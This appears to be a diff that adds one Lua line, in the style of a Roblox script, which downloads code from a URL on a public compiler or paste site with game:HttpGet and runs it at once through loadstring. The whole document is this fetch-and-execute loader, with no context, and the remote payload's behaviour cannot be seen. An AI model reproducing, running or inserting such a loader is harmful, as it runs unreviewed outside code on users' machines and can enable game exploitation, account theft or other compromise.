@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://www.mycompiler.io/download/6WUTC7kdbZa"))()
